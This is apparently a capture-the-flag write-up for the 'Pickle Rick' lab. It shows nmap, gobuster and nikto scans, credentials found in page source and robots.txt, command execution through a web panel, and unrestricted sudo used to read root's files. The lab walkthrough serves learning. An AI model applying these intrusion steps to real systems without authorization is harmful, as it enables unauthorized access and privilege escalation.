# Pickle Rick

> RedAiden

## Enumeration

### Nmap

`nmap -sC -sV 10.10.x.x`
```
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 95:3a:6f:96:7c:5d:41:cf:92:20:da:78:c7:19:ef:c7 (RSA)
|   256 50:c4:46:76:ca:f4:30:3c:8a:dc:89:2a:34:87:78:ef (ECDSA)
|_  256 d7:50:77:27:5e:1c:1b:f2:62:e6:9d:dc:10:4f:9a:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### gobuster

`gobuster dir -w /usr/share/wordlists/dirb/big.txt -u 10.10.x.x`

```
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd            (Status: 403) [Size: 295]
/assets               (Status: 301) [Size: 311] [--> http://10.10.x.x/assets/]
/robots.txt           (Status: 200) [Size: 17]                                  
/server-status        (Status: 403) [Size: 299] 
```

### nikto

`nikto -host http://10.10.1.213`
```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.1.213
+ Target Hostname:    10.10.1.213
+ Target Port:        80
+ Start Time:         2021-01-21 01:29:09 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 7889 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2021-01-21 01:29:57 (GMT0) (48 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### Web page

When we visit the web app, we can see that Rick needs some help getting the ingredients. First thing we can do is check the page source, where we can find a username: `R1ckRul3s`. There's nothing else on the page, so we can move on.

Next let's check the found directories with gobuster. In the `/assets` directory we find some images and gifs but nothing important. Inspecting `/robots.txt` we find the following: `Wubbalubbadubdub`, which could be a potential password.

From the nikto scan we can see a `/login.php` page. Upon entering we are asked for a username and password. We can use the ones we have discovered so far:
- Username: `R1ckRul3s`
- Password: `Wubbalubbadubdub`

```
mr. meeseek hair
```

## Exploitation

We now have acces to a Command Panel where we can run linux commands.


### First ingredient

1. Run `ls` to list all files. We see a file called `Sup3rS3cretPickl3Ingred.txt`.
   - Unfortunately, we can't cat the file because of our permissions
2. To access the file, navigate to its URL: `http://10.10.1.213/Sup3rS3cretPickl3Ingred.txt`. You'll find the first ingredient here.

### Second Ingredient

1. If we read the `clue.txt` file we get a hint to search in the file system. Run `pwd` to see our current path.
2. We now know we are in `/var/www/html`. Let's go back to the home directory and list everything: `ls -la ../../../`
3. Reading through the output we see the `home` folder. We can see its contents with `ls -la /home/`
4. We can see another folder called `rick`. We can access it the same way `ls -la /home/rick`
5. There we find our second ingredient. Read the file with `less /home/rick/second\ ingredients`

### Third Ingredient
1. Remember in the home directory listing we saw a `/root` folder but we didn't have the permissions to read it. Run `sudo -l` to view our permissions
```
Matching Defaults entries for www-data on ip-10-10-1-213.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-1-213.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```
2. It looks like we can use sudo for anything that doesn't require a password, like `ls` and we can abuse that to read the contents of the folder. Run `sudo ls -la /root`
3. We can find the 3rd ingredient in this folder. Read it with `sudo less /root/3rd.txt`